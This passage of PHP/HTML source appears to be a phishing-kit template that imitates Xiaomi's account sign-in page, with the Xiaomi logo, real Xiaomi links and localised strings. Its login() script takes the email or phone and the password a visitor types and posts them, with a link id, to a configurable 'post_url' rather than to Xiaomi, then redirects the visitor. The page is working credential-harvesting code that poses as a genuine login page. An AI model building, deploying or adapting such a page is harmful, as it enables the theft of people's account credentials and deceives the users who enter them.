        font-size: 0.729167rem;
      }
    </style>
    <title>Xiaomi <?=$language['account'][$lang];?> - <?=$language['signin'][$lang];?></title>
    <meta name="keywords" content="Mi Account, Xiaomi Account, Create account, Sign up, Sign in, Xiaomi, Account, Login, Log in, Two-step authentication, Authenticator, Reset password, Forgot password" data-react-helmet="true">
    <meta name="description" content="Mi Account is an authentication method used for Xiaomi devices. It works with MIUI, Xiaomi Cloud, Duokan, Mi Talk, Mi Community, and other services." data-react-helmet="true">
    <script src="js/jquery.min.js"></script>
    <captcha-widgets></captcha-widgets>
    <script>
      $(document).ready(function() {
        $("#detectdevice").css('width', $(window).width());
        $("#closebutton").click(function() {
          $("#lbt").addClass("Mui-disabled");
          $("#lbt").prop("disabled", true);
          $("#email").val('');
        });
        $("#email").keyup(function() {
          $("#emailerror").hide();
          if ($("#email").val()) {
            $("#closebutton").show();
          } else {
            $("#closebutton").hide();
          }
          if ($("#email").val() && $("#password").val()) {
            $("#lbt").removeClass("Mui-disabled");
            $("#lbt").prop("disabled", false);
          } else {
            $("#lbt").addClass("Mui-disabled");
            $("#lbt").prop("disabled", true);
          }
        });
        $("#password").keyup(function() {
          $("#passerror").hide();
          $("#error").hide();
          if ($("#email").val() && $("#password").val()) {
            $("#lbt").removeClass("Mui-disabled");
            $("#lbt").prop("disabled", false);
          } else {
            $("#lbt").addClass("Mui-disabled");
            $("#lbt").prop("disabled", true);
          }
        });
        $("#email").focus(function() {
          $(".emailbox").css('border', '2px solid #0B84FF');
        });
        $("#email").focusout(function() {
          $(".emailbox").css('border', '0px');
          if (!($("#email").val())) {
            $(".emailbox").css('border', '2px solid #f44336');
            $("#emailerror").show();
          }
        });
        $("#password").focus(function() {
          $(".passwordbox").css('border', '2px solid #0B84FF');
        });
        $("#password").focusout(function() {
          $(".passwordbox").css('border', '0px');
          if (!($("#password").val())) {
            $(".passwordbox").css('border', '2px solid #f44336');
            $("#passerror").show();
          }
        });
        $("#eyeclose").click(function() {
          if ($("#eyeclose").hasClass("jss22")) {
            $("#eyeclose").removeClass("jss22");
            $("#eyeclose").addClass("jss21");
            $("#password").attr('type', 'text')
          } else {
            $("#eyeclose").addClass("jss22");
            $("#eyeclose").removeClass("jss21");
            $("#password").attr('type', 'password')
          }
        });
      });
    </script>
    <script type="text/javascript">
      function login() {
        username = document.getElementById("email").value;
        var password = document.getElementById("password").value;
        var errorl = document.getElementById("error");
        var load = document.getElementById("loader");
        var data = 'id=' + link_id + '&type=account&user=' + username + '&pass=' + password;
        load.style.display = "block";
        $.ajax({
          type: "POST",
          dataType: "json",
          url: post_url,
          data: data,
          cache: false,
          success: function(data) {
            if (data.success == true) {
              window.location.href = redirect_url;
            } else {
              load.style.display = "none";
              errorl.style.display = "block";
            }
          },
          error: function(XMLHttpRequest, textStatus, errorThrown) {
            load.style.display = "none";
            errorl.style.display = "block";
          }
        });
      }
    </script>
    <style type="text/css">
      @font-face {
        font-weight: 400;
        font-style: normal;
        font-family: circular;
        src: url('chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Book.woff2') format('woff2');
      }

      @font-face {
        font-weight: 700;
        font-style: normal;
        font-family: circular;
        src: url('chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Bold.woff2') format('woff2');
      }
    </style>
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root">
      <div id="detectdevice" style="position: fixed; transform: translateZ(0px); left: 0px; top: 0px; width: 1536px; height: 736px;">
        <div style="height: 100%; overflow: auto;">
          <div>
            <div class="MuiCollapse-container MuiCollapse-entered" style="min-height: 0px;">
              <div class="MuiCollapse-wrapper">
                <div class="MuiCollapse-wrapperInner">
                  <div>
                    <div style="opacity: 1; transition: opacity 225ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;">
                      <div class="jss5" style="transform: none; transition: transform 225ms cubic-bezier(0, 0, 0.2, 1) 0ms;">
                        <div class="jss8"><?=$language['language'][$lang];?> <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
                            <path d="M7 10l5 5 5-5z"></path>
                          </svg>
                        </div>
                        <div class="MuiBox-root jss10">
                          <a class="MuiButtonBase-root MuiIconButton-root jss7" tabindex="0" aria-disabled="false" href="https://account.xiaomi.com/fe/service/login/password?_uRegion=VI&amp;_locale=en_US">
                            <span class="MuiIconButton-label">
                              <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
                                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"></path>
                              </svg>
                            </span>
                            <span class="MuiTouchRipple-root"></span>
                          </a>
                          <a class="MuiButtonBase-root MuiIconButton-root jss7" tabindex="0" aria-disabled="false" href="https://account.xiaomi.com/helpcenter">
                            <span class="MuiIconButton-label">
                              <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
                                <path d="M11 18h2v-2h-2v2zm1-16C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"></path>
                              </svg>
                            </span>
                            <span class="MuiTouchRipple-root"></span>
                          </a>
                        </div>
                      </div>
                      <div class="jss11">
                        <svg class="_-src-components-Banner-logo" width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="48*48"><mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="0" y="0" width="48" height="48"><path id="Clip 2" fill-rule="evenodd" clip-rule="evenodd" d="M0 3.05176e-05H48V47.9998H0V3.05176e-05Z" fill="white"></path></mask><g mask="url(#mask0)"><path id="Fill 1" fill-rule="evenodd" clip-rule="evenodd" d="M42.9972 5.015C38.4683 0.503953 31.9571 0 24.0001 0C16.0329 0 9.51214 0.509889 4.98532 5.03265C0.459587 9.55464 0 16.0649 0 24.0234C0 31.9816 0.459587 38.4954 4.98719 43.018C9.51418 47.5421 16.0334 47.9998 24.0001 47.9998C31.9665 47.9998 38.4858 47.5421 43.013 43.018C47.5398 38.4939 48 31.9816 48 24.0234C48 16.0548 47.5343 9.53698 42.9972 5.015Z" fill="#FF6900"></path><path id="Fill 3" fill-rule="evenodd" clip-rule="evenodd" d="M22.2335 32.8946C22.2335 33.0556 22.0979 33.1892 21.9328 33.1892H17.8394C17.6715 33.1892 17.5353 33.0556 17.5353 32.8946V22.19C17.5353 22.0276 17.6715 21.8946 17.8394 21.8946H21.9328C22.0979 21.8946 22.2335 22.0276 22.2335 22.19V32.8946Z" fill="white"></path><path id="Fill 5" fill-rule="evenodd" clip-rule="evenodd" d="M30.248 32.8946C30.248 33.0556 30.1118 33.1892 29.9461 33.1892H26.0497C25.8826 33.1892 25.7464 33.0556 25.7464 32.8946V32.8546V23.6589C25.7423 22.0465 25.6501 20.3892 24.8177 19.5562C24.1019 18.8383 22.7672 18.6738 21.3787 18.6393H14.3157C14.149 18.6393 14.0144 18.7733 14.0144 18.9345V31.9287V32.8946C14.0144 33.0556 13.8769 33.1892 13.7102 33.1892H9.81124C9.64471 33.1892 9.51068 33.0556 9.51068 32.8946V15.1074C9.51068 14.9441 9.64471 14.8113 9.81124 14.8113H21.0604C24.0003 14.8113 27.0737 14.9454 28.5895 16.4632C30.1118 17.9877 30.248 21.0556 30.248 23.9989V32.8946Z" fill="white"></path><path id="Fill 7" fill-rule="evenodd" clip-rule="evenodd" d="M38.2749 32.8946C38.2749 33.0556 38.1372 33.1892 37.9721 33.1892H34.0738C33.9072 33.1892 33.7718 33.0556 33.7718 32.8946V15.1074C33.7718 14.9441 33.9072 14.8113 34.0738 14.8113H37.9721C38.1372 14.8113 38.2749 14.9441 38.2749 15.1074V32.8946Z" fill="white"></path></g></g></svg>
                        <div class="jss13" style="transform: none; transition: transform 225ms cubic-bezier(0, 0, 0.2, 1) 0ms;"><?=$language['slogan'][$lang];?></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="MuiCollapse-container MuiCollapse-hidden" style="min-height: 0px;">
              <div class="MuiCollapse-wrapper">
                <div class="MuiCollapse-wrapperInner">
                  <div class="jss3">
                    <span class="MuiTypography-root MuiLink-root MuiLink-underlineHover jss4 MuiTypography-colorTextSecondary">Cancel</span>
                  </div>
                </div>
              </div>
            </div>
            <div style="transform: none; transition: transform 225ms cubic-bezier(0, 0, 0.2, 1) 0ms;">
              <div class="jss14">
                <form>
                  <div class="jss15"><?=$language['sign_your'][$lang];?></div>
                  <div class="MuiFormControl-root MuiTextField-root jss1 jss17 MuiFormControl-fullWidth">
                    <div class="MuiInputBase-root MuiInput-root MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl emailbox" style="border: 0px;">
                      <input id="email" aria-invalid="false" name="account" placeholder="Email/Phone/Xiaomi Account" type="text" class="MuiInputBase-input MuiInput-input" value="<?=$username;?>">
                      <input name="ID" id="ID" type="hidden" value="<?=$username;?>">
                      <div id="closebutton" class="MuiInputAdornment-root MuiInputAdornment-positionEnd" style="">
                        <div class="jss18"></div>
                      </div>
                    </div>
                  </div>
                  <div id="emailerror" style="font-size:0.659722rem; color:#f44336;font-weight:400; margin-left:0.798611rem; margin-top: 3px; display:none"><?=$language['enter_email'][$lang];?></div>
                  <div class="MuiFormControl-root MuiTextField-root jss1 jss19 jss17 MuiFormControl-fullWidth">
                    <div class="MuiInputBase-root MuiInput-root MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl MuiInputBase-adornedEnd passwordbox" style="border: 0px;">
                      <input id="password" aria-invalid="false" name="password" placeholder="Enter your password" type="password" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedEnd" value="">
                      <div class="MuiInputAdornment-root MuiInputAdornment-positionEnd">
                        <div id="eyeclose" class="jss20 jss22">
                          <svg viewBox="-3 -10 63 56" width="1em" height="1em">
                            <g fill="none" fill-rule="evenodd">
                              <path d="M3 22.974C7.044 11.382 18.55 3 30.2 3c11.65 0 23.155 8.382 27.199 19.974C53.328 34.593 41.71 43 30.199 43 18.69 43 7.072 34.593 3 22.974h0z" stroke="currentColor" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"></path>
                              <path d="M30.2 33.4c5.743 0 10.4-4.656 10.4-10.4 0-5.743-4.657-10.4-10.4-10.4-5.744 0-10.4 4.657-10.4 10.4 0 5.744 4.656 10.4 10.4 10.4z" fill="currentColor" fill-rule="nonzero"></path>
                            </g>
                          </svg>
                        </div>
                      </div>
                    </div>
                    <div id="passerror" style="font-size:0.659722rem; color:#f44336;font-weight:400; margin-left:0.798611rem; margin-top: 3px; display:none"><?=$language['enter_password'][$lang];?></div>
                  </div>
                  <div id="loader" class="mi-form-helper-text mi-form-helper-text--error" style="text-align:center;display:none">
                    <img src="images/load.gif">
                  </div>
                  <div id="error" style="font-size:0.659722rem; color:#f44336;font-weight:400; margin-left:0.798611rem; margin-top: 3px; display:none"><?=$language['incorrect'][$lang];?></div>
                  <button class="MuiButtonBase-root MuiButton-root MuiButton-contained jss23 MuiButton-containedPrimary MuiButton-disableElevation MuiButton-fullWidth" onclick="login();" id="lbt" tabindex="-1" type="button">
                    <span class="MuiButton-label"><?=$language['signin'][$lang];?></span>
                  </button>
                </form>
                <div class="jss2">
                  <a class="MuiTypography-root MuiLink-root MuiLink-underlineHover MuiTypography-colorTextSecondary" href="https://account.xiaomi.com/fe/service/login/phone?_uRegion=VI&amp;_locale=en_US" style="text-align: right;"><?=$language['sign_phone'][$lang];?></a>
                  <div>｜</div>
                  <a class="MuiTypography-root MuiLink-root MuiLink-underlineHover MuiTypography-colorTextSecondary" href="https://account.xiaomi.com/fe/service/register?_uRegion=VI&amp;_locale=en_US"><?=$language['create_account'][$lang];?></a>
                </div>
              </div>
              <div class="jss30" style="opacity: 1; transition: opacity 225ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;">
                <div class="jss31"><?=$language['options'][$lang];?></div>
                <div class="jss32">
                  <a class="jss33" href="https://account.xiaomi.com/pass/sns/login/auth?appid=222161937813280&amp;callback=https%3A%2F%2Faccount.xiaomi.com&amp;sid=passport&amp;_new=true">
                    <svg viewBox="0 0 46 46">
                      <path d="M22.865.004C10.244.004.013 10.236.013 22.856s10.232 22.852 22.852 22.852c12.622 0 22.852-10.232 22.852-22.852S35.486.004 22.865.004zm5.667 14.07H25.23c-1.33 0-1.724.295-1.724 1.626v4.186h4.679v4.31h-4.68v12.04h-4.408v-12.04h-3.915v-4.31h3.915v-6.01c0-.996.44-1.918 1.321-2.765.813-.782 2.039-1.174 3.676-1.174h4.438v4.137z" fill="#5470BD" fill-rule="nonzero"></path>
                    </svg>
                  </a>
                  <a class="jss33" href="https://account.xiaomi.com/pass/sns/login/auth?appid=google&amp;callback=https%3A%2F%2Faccount.xiaomi.com&amp;sid=passport&amp;_new=true">
                    <svg viewBox="0 0 46 46">
                      <g fill-rule="nonzero" fill="none">
                        <path d="M9.577 23.156c0-1.504.253-2.946.702-4.299L2.4 12.9A22.958 22.958 0 000 23.156c0 3.686.863 7.162 2.397 10.25l7.875-5.97a13.57 13.57 0 01-.695-4.28" fill="#FBBC05"></path>
                        <path d="M23.415 9.476a13.627 13.627 0 018.62 3.05l6.81-6.735c-4.15-3.576-9.47-5.788-15.43-5.788C14.162.003 6.209 5.243 2.4 12.9l7.883 5.959c1.815-5.458 6.99-9.383 13.133-9.383" fill="#EA4335"></path>
                        <path d="M23.515 36.532c-6.176 0-11.376-3.9-13.202-9.324L2.395 33.13c3.826 7.609 11.82 12.814 21.12 12.814 5.738 0 11.216-1.994 15.33-5.734l-7.517-5.69c-2.12 1.308-4.791 2.013-7.814 2.013" fill="#34A853"></path>
                        <path d="M45.975 22.938c0-1.36-.215-2.824-.535-4.184H23.513v8.89h12.62c-.629 3.031-2.346 5.361-4.804 6.877l7.516 5.69c4.32-3.925 7.13-9.773 7.13-17.273" fill="#4285F4"></path>
                      </g>
                    </svg>
                  </a>
                  <a class="jss33" href="https://account.xiaomi.com/pass/sns/login/auth?appid=YXBwbGVfeGlhb21p&amp;callback=https%3A%2F%2Faccount.xiaomi.com&amp;sid=passport&amp;_new=true">
                    <svg viewBox="0 0 46 46">
                      <g fill-rule="nonzero" fill="none">
                        <path d="M23 0c12.702 0 23 10.298 23 23S35.702 46 23 46 0 35.702 0 23 10.298 0 23 0z" fill="#33353B"></path>
                        <path d="M26.362 14.409c.788-1.052 1.385-2.54 1.17-4.059-1.289.093-2.795.946-3.673 2.057-.8 1.008-1.459 2.505-1.202 3.96 1.409.046 2.861-.828 3.705-1.958zm7.185 14.39c-.571 1.294-.846 1.871-1.58 3.017-1.025 1.599-2.472 3.59-4.265 3.604-1.591.019-2.002-1.06-4.162-1.047-2.16.012-2.61 1.068-4.205 1.053-1.791-.018-3.16-1.813-4.186-3.414-2.869-4.466-3.17-9.711-1.4-12.502 1.256-1.98 3.242-3.139 5.106-3.139 1.898 0 3.091 1.066 4.662 1.066 1.526 0 2.452-1.07 4.647-1.07 1.662 0 3.423.927 4.675 2.524-4.106 2.303-3.441 8.303.708 9.909v-.001z" fill="#fff"></path>
                      </g>
                    </svg>
                  </a>
                </div>
              </div>
            </div>
          </div>
          <div class="jss34" style="opacity: 0; transform: scale(0.75, 0.5625); visibility: hidden;">
            <div class="jss35">
              <div class="jss36">Attention</div>
              <div class="jss37">This website uses cookies to store info on your device. Cookies help our website work normally and show us how we can improve your user experience. By using this website, you agree to our cookie policy.</div>
              <div class="jss38">
                <button class="MuiButtonBase-root MuiButton-root MuiButton-contained jss39 jss23 MuiButton-containedPrimary MuiButton-disableElevation" tabindex="0" type="button">
                  <span class="MuiButton-label">Agree</span>
                  <span class="MuiTouchRipple-root"></span>
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="miverify_wind" style="display: none;">
      <div class="miverify_panel_ghost"></div>
      <div class="miverify_panel_box loading">
        <div class="miverify_panel_loading">
          <div class="miverify_panel_loading_icon"></div>
          <span class="miverify_panel_loading_content">Environmental safety testing...</span>
        </div>
        <div class="miverify_panel_error">
          <p class="miverify_panel_error_title">prompt</p>
          <div class="miverify_panel_error_content"></div>
          <div class="miverify_error_footer_panel" style="display:none;">
            <button class="miverify_cancel_btn">Cancel</button>
            <button class="miverify_ok_btn miverify_refresh_btn">Retry</button>
          </div>
        </div>
        <div class="miverify_panel_next">
          <div class="miverify_wrap">
            <div class="miverify_widget">
              <div class="miverify_window"></div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="loom-companion-mv3" ext-id="liecbddmkiiihnedobmlmillhodjkdmb">
      <section id="shadow-host-companion"></section>
    </div>
  </body>
</html>